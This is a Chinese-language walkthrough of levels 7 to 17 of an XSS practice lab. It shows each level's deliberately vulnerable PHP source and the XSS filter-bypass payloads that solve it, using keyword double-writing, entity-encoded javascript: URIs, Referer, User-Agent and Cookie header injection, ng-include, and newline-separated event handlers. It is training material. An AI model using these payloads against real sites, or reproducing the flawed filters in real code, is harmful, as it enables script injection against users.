+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line"></span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line"></span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line"></span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+分析代码，不仅大小写不能用了，script，on，src ，data ，href 都直接转换成空，
+
+尝试双写绕过，构造payload:
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;</span><br><span class="line"></span><br><span class="line">&quot; oonnmouseover=alert(1)</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;bmjoker</span><br></pre></td></tr></table></figure>
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)
+
+闯关成功！！！
+
+
+
+
+
+
+
+**Level 8:**
+
+ ![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)
+
+分析一下源代码中的判断xss的代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line"></span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line"></span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line"></span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line"></span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"> echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+分析代码，<script 转换成 <scr_ipt ，on 转换成 o_n ，src 转换成 sr_c ，data 转换成 da_ta，href 转换成 hr_ef，
+
+大小写也失效了，" 还被编码，但是尖括号<> ，单引号 ' ,% ，# ，& 符号没有被过滤，输出点在a标签内，href属性中，
+
+属性中双引号被转换成HTML实体，无法截断属性，我们可以使用协议绕过javascript:alert，由于script关键字被过滤，
+
+javascript会被替换成javasc_rpt，我们使用&#x72来代替r ,HTML字符实体转换：https://www.qqxiuzi.cn/bianma/zifushiti.php
+
+，伪协议后面可以使用URL编码等进行编码。构造payload：
+
+javascrip&#x74;:alert(1)
+
+javascript:%61lert(1)
+
+javasc&#x72;ipt:alert`1`
+
+javasc&#x0072;ipt:alert`1`
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)
+
+成功过关！！！
+
+
+
+
+
+**Level 9:**
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg)
+
+分析一下源代码中的判断xss的代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line"></span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line"></span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line"></span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line"></span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+分析代码，发现跟上个挑战大同小异，不同的是多了自己自动检测url，如果发现没有带http:// 内容则会显示不合法，
+
+构造payload：
+
+javascrip&#x74;:alert(1)//http://xxx.com  //利用注释
+
+javascrip&#x74;:%0dhttp://xxx.com%0dalert(1)  //不利用注释
+
+javascrip&#x74;:%0ahttp://xxx.com%0daalert(1)  //不利用注释
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)
+
+闯关成功！！！
+
+
+
+
+
+**Level 10:**
+
+**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg)**
+
+分析一下源代码中的判断xss的代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line"></span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line"></span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+分析代码，发现需要两个参数，一个是keyword，一个是t_sort，尖括号<>都被转换成空，还有三个hidden的隐藏输入框，
+
+或许我们可以从隐藏的输入框下手，构造payload：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onclick = &quot;alert(1)</span><br><span class="line"></span><br><span class="line">keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=&quot;alert(1)</span><br><span class="line"></span><br><span class="line">keyword = test&amp;t_sort=&quot;type=&quot;text&quot; onmouseover=alert`1`</span><br><span class="line"></span><br><span class="line">这样的话：&lt;input name=&quot;t_sort&quot; value=&quot; &quot; type=&quot;text&quot; onclick = &quot;alert(1)&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+构成一个js的点击弹窗事件：
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg)
+
+闯关成功！！！
+
+
+
+ **Level 11:**
+
+**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)**
+
+分析一下源代码中的判断xss的代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line"></span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line"></span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line"></span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+分析代码，发现比起上一个挑战来说，多了一个 str11=str11=_SERVER['HTTP_REFERER']; 考察的是http头部的
+
+xss注入，开始抓包，burp修改相应的字段，构造http头部Referer的payload:
+
+Referer: " onmouseover=alert(1) type="text"
+
+Referer: " onclick="alert(1) type="text"
+
+burp抓包，改Referer头：
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)
+
+forward发包
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)
+
+闯关成功！！！
+
+
+
+
+
+**Level 12:**
+
+**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)**
+
+
+
+分析一下源代码中的判断xss的代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line"></span><br><span class="line">$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line"></span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line"></span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_ua&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+分析代码，这次换成了 str11=str11=_SERVER['HTTP_USER_AGENT'];  应该是User-Agent的http头部注入，
+
+burp抓包，构造http头部User-Agent的payload:
+
+User-Agent: " onmouseover=alert(1) type="text"
+
+User-Agent: " onclick="alert(1) type="text"
+
+burp抓包，改User-Agent头：
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)
+
+forward发包：
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)
+
+闯关成功！！！
+
+
+
+**Level 13:**
+
+**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)**
+
+
+
+分析一下源代码中的判断xss的代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line"></span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line"></span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line"></span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line"></span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input name=&quot;t_cook&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+分析代码，这次换成了 setcookie("user", "call me maybe?", time()+3600);  应该是cookie类型的xss注入
+
+直接构造payload:
+
+Cookie: " onmouseover=alert(1) type="text"
+
+Cookie: " onclick="alert(1) type="text"
+
+burp抓包，改cookie：
+
+ ![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)
+
+forward发包：
+
+![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg)
+
+
+
+
+
+**Level 14:**
+
+....level14崩了，我们看一下大佬的payload:
+
+  `"><img src=1 onerror=alert(1)>`
+
+百度得出答案，这里用的是乌云爆出的exif viewer的漏洞,漏洞原理是通过修改图片的exif信息，
+
+造成解析图片exif触发XSS。利用工具推荐exiftool。以后看见上传果断又一个姿势啊。
+
+修改图片exif信息如标题，作者。
+
+
+
+**Level 15:**
+
+**![img](file:///C:/Users/韦文杰/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)**
+
+分析一下源代码中的判断xss的代码：
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br></pre></td></tr></table></figure>
+
+<head>
+        <meta
+charset="utf-8">
+        <script
+src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js"></script>
+<script>
+window.alert = function()  
+{     
+confirm("完成的不错！");
+ window.location.href="level16.php?keyword=test"; 
+}
+</script>
+<title>欢迎来到level15</title>
+
+<h1 align="center">欢迎来到第15关，自己想个办法走出去吧！</h1>
+<p align="center"><img src="/2019/11/20/XSS平台练习/XSS平台练习/level15.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;,</span><br><span class="line">0);</span><br><span class="line">$str =</span><br><span class="line">$_GET[&quot;src&quot;];</span><br><span class="line">echo</span><br><span class="line">&apos;&lt;body&gt;&lt;span</span><br><span class="line">class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码，这一关考的angular js的知识，稍微百度一下相关知识，发现ng-include有包含文件的意思，也就相当于php里面的include</p>
+<p>发现可以包含第一关的页面，构造payload:</p>
+<p> src=’level1.php?name=<img src="/2019/11/20/XSS平台练习/XSS平台练习/x" onerror="alert(1)">‘</p>
+<p>emmm……</p>
+<p><strong>Level 16:</strong></p>
+<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg" alt="img"></strong></p>
+<p>分析一下源代码中的判断xss的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line"></span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line"></span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line"></span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line"></span><br><span class="line">$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>分析代码，发现大小写绕过失效，script ,  / ,   ,等都被转换成&amp;nbsp，我们可以用%0d，%0a等绕过：</p>
+<p>构造payload：</p>
+<p>&lt;img%0Dsrc=1%0Donerror=alert(1)&gt;</p>
+<p>&lt;iframe%0asrc=x%0donmouseover=alert<code>1</code>&gt;</p>
+<p>&lt;svg%0aonload=alert<code>1</code>&gt;</p>
+<p><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg" alt="img"></p>
+<p>闯关成功！！！</p>
+<p> <strong>Level 17:</strong></p>
+<p><strong><img src="file:///C:/Users/%E9%9F%A6%E6%96%87%E6%9D%B0/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg" alt="img"></strong></p>
+<p>分析一下源代码中的判断xss的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>刚开始以为是Flash XSS，仔细一看发现不是，使用了htmlspecialchars进行实体编码，和第三关就一样了，使用on事件。</p>
+<p>构造payload:</p>
+<p>arg01=123&amp;arg02= onmouseover=alert(1)</p>
